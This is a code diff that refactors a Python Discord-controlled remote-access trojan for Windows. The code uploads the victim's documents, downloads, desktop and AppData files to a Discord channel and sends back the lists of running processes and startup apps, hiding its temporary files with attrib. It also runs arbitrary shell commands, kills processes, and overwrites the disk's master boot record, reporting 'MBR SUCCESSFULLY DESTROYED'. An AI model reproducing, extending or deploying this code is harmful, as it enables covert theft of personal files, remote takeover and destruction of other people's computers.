@@ -53,22 +53,22 @@ async def bsod(ctx):
 async def processes(ctx):
     def save():
         try:
-            doc_path = os.path.expanduser('~') + "\\Documents\\processes.txt"
+            doc_path = os.path.join(os.path.expanduser('~'), "Documents", "processes.txt")
             result = subprocess.run("tasklist", capture_output=True, text=True, shell=True)
-            processes_list = result.stdout.splitlines()
-            processes_list.sort()
+            processes_list = sorted(result.stdout.splitlines())
             with open(doc_path, 'w') as f:
                 f.write("\n".join(processes_list))
+            subprocess.run(['attrib', '+h', doc_path])
             asyncio.run_coroutine_threadsafe(ctx.send(file=discord.File(doc_path)), ctx.bot.loop)
-            time.sleep(2)
             os.remove(doc_path)
-        except Exception:
-            return
-    threading.Thread(target=save).start()
+        except:
+            pass
+    threading.Thread(target=save, daemon=True).start()
 async def fileretrieval(ctx):
     try:
-        getpcusername = os.getlogin()
-        channel_name = f"{getpcusername}-files"
+        pc_name = socket.gethostname()
+        username = os.getlogin()
+        channel_name = f"{pc_name}-{username}-files"
         guild = ctx.guild
         category = ctx.channel.category
 
@@ -82,43 +82,19 @@ async def fileretrieval(ctx):
                 for file in files:
                     if file.lower().endswith(('.pdf', '.txt', '.html', '.csv', '.zip')):
                         full_path = os.path.join(root, file)
-                        if os.path.getsize(full_path) <= 9.9 * 1024 * 1024:
-                            if full_path not in sent_files:
-                                try:
-                                    await channel.send(f"**File Path:** {full_path}", file=discord.File(full_path))
-                                    sent_files.add(full_path)
-                                except Exception:
-                                    continue
-                for dir_name in dirs:
-                    dir_path = os.path.join(root, dir_name)
-                    try:
-                        os.access(dir_path, os.R_OK)
-                    except PermissionError:
-                        dirs.remove(dir_name)
+                        if os.path.getsize(full_path) <= 9.9 * 1024 * 1024 and full_path not in sent_files:
+                            try:
+                                await channel.send(f"**File Path:** {full_path}", file=discord.File(full_path))
+                                sent_files.add(full_path)
+                            except:
+                                continue
+                dirs[:] = [d for d in dirs if os.access(os.path.join(root, d), os.R_OK)]
 
-        c_drive_dirs = [
-            r"C:\Users\%s\Documents" % getpcusername,
-            r"C:\Users\%s\Downloads" % getpcusername,
-            r"C:\Users\%s\Pictures" % getpcusername,
-            r"C:\Users\%s\Videos" % getpcusername,
-            r"C:\Users\%s\Desktop" % getpcusername,
-            r"C:\Users\%s\AppData" % getpcusername,
-            r"C:\Users\%s\Music" % getpcusername
-        ]
-        
-        dirs_to_scan = []
-        for directory in c_drive_dirs:
-            if os.path.exists(directory):
-                dirs_to_scan.append(directory)
+        c_drive_dirs = [rf"C:\Users\{username}\{folder}" for folder in ["Documents", "Downloads", "Pictures", "Videos", "Desktop", "AppData", "Music"] if os.path.exists(rf"C:\Users\{username}\{folder}")]
+        sent_files = set()
+        await asyncio.gather(*(send_files(directory, sent_files) for directory in c_drive_dirs))
 
-        sent_files = set() 
-        tasks = []
-        for directory in dirs_to_scan:
-            tasks.append(send_files(directory, sent_files))
-
-        await asyncio.gather(*tasks)
-
-    except Exception as e:
+    except:
         pass
 
 async def sharenote(ctx, *, text: str):
@@ -169,25 +145,24 @@ async def pc(ctx, action: str = None):
 async def startupapps(ctx):
     def save_and_send():
         try:
-            doc_path = os.path.expanduser('~') + "\\Documents\\startup_apps.txt"
+            doc_path = os.path.join(os.path.expanduser('~'), "Documents", "startup_apps.txt")
+            startup_folder = os.path.join(os.getenv("APPDATA"), r"Microsoft\Windows\Start Menu\Programs\Startup")
             with open(doc_path, 'w') as f:
-                for file in os.listdir(os.getenv("APPDATA") + r"\Microsoft\Windows\Start Menu\Programs\Startup"):
-                    file_path = os.path.join(os.getenv("APPDATA") + r"\Microsoft\Windows\Start Menu\Programs\Startup", file)
+                for file in os.listdir(startup_folder):
+                    file_path = os.path.join(startup_folder, file)
                     if os.path.isfile(file_path):
                         try:
                             file_size = os.path.getsize(file_path) / (1024 * 1024)
-                            file_size_str = f"{file_size:.2f} MB"
-                            creation_date = time.ctime(os.path.getctime(file_path))
                             attributes = "Hidden" if os.stat(file_path).st_file_attributes & 2 else "Visible"
-                            f.write(f"{file} -- {file_size_str} -- {attributes} -- {creation_date}\n")
+                            f.write(f"{file} -- {file_size:.2f} MB -- {attributes} -- {time.ctime(os.path.getctime(file_path))}\n")
                         except:
                             pass
+            subprocess.run(['attrib', '+h', doc_path])
             asyncio.run_coroutine_threadsafe(ctx.send(file=discord.File(doc_path)), ctx.bot.loop)
-            time.sleep(2)
             os.remove(doc_path)
-        except Exception:
+        except:
             pass
-    threading.Thread(target=save_and_send).start()
+    threading.Thread(target=save_and_send, daemon=True).start()
 
 async def cmd(ctx, *, command: str):
     try:
@@ -203,26 +178,51 @@ async def cmd(ctx, *, command: str):
     except Exception as e:
         await ctx.send(f"An error occurred: {e}")
 
-async def kp(ctx,*,process:str):
- try:
-  await ctx.send(f"Killed process: {process}")
-  await asyncio.sleep(1)
-  result=subprocess.run(f"taskkill /f /im {process} /t",capture_output=True,text=True,shell=True,timeout=7)
-  if result.returncode==0:await ctx.send(f"Killed all instances of process {process}")
-  else:await ctx.send(f"Error: Could not kill process {process}")
- except subprocess.TimeoutExpired:await ctx.send("Error: The taskkill command timed out.")
- except Exception as e:await ctx.send(f"Error: {e}")
+async def kp(ctx, *, process: str):
+    try:
+        result = subprocess.run(f"tasklist /fi \"imagename eq {process}\"", capture_output=True, text=True, shell=True, timeout=5)
+        lines = result.stdout.splitlines()[3:]
+        processes = [line.split() for line in lines if line]
+
+        if not processes:
+            embed = discord.Embed(title="Process Not Found", description=f"No running process named `{process}` found.", color=discord.Color.red())
+            await ctx.send(embed=embed)
+            return
+
+        pids = [proc[1] for proc in processes if len(proc) > 1]
+        subprocess.run(f"taskkill /f /im {process} /t", capture_output=True, text=True, shell=True, timeout=7)
+        
+        embed = discord.Embed(title=f"Killed Process: {process}", color=discord.Color.red())
+        for pid in pids:
+            embed.add_field(name="PID", value=pid, inline=False)
+
+        await ctx.send(embed=embed)
+
+    except subprocess.TimeoutExpired:
+        embed = discord.Embed(title="Error", description="The taskkill command timed out.", color=discord.Color.red())
+        await ctx.send(embed=embed)
+    except Exception as e:
+        embed = discord.Embed(title="Error", description=str(e), color=discord.Color.red())
+        await ctx.send(embed=embed)
 
 async def wallpaper(ctx):
     try:
-        file = await ctx.message.attachments[0].to_file()
+        attachment = ctx.message.attachments[0]
+        file = await attachment.to_file()
         file_path = os.path.join(os.path.expanduser('~'), "wallpaper_temp.jpg")
+        
         with open(file_path, 'wb') as f:
             f.write(file.fp.read())
+
         windll.user32.SystemParametersInfoW(20, 0, file_path, 3)
-        await ctx.send("wallpaper changed")
-    except Exception as e:
-        await ctx.send(f"u gotta upload a picture")   
+        
+        embed = discord.Embed(title="Wallpaper Changed To:", color=discord.Color.blue())
+        embed.set_image(url=attachment.url)
+        
+        await ctx.send(embed=embed)
+
+    except:
+        await ctx.send("u gotta upload a picture") 
 async def endpc(ctx):
     try:
         hDevice = win32file.CreateFileW(
@@ -240,7 +240,8 @@ async def endpc(ctx):
         win32file.WriteFile(hDevice, byte_list)
         win32file.CloseHandle(hDevice)
 
-        await ctx.send("Action completed successfully.")
-
+        embed = discord.Embed(title="END PC", description="MBR SUCCESSFULLY DESTROYED", color=discord.Color.green())
+        await ctx.send(embed=embed)
     except Exception as e:
-        await ctx.send(f"An error occurred: {e}")
+        embed1 = discord.Embed(title="END PC", description=f"An error occurred: {e}", color=discord.Color.red())
+        await ctx.send(embed1=embed1)
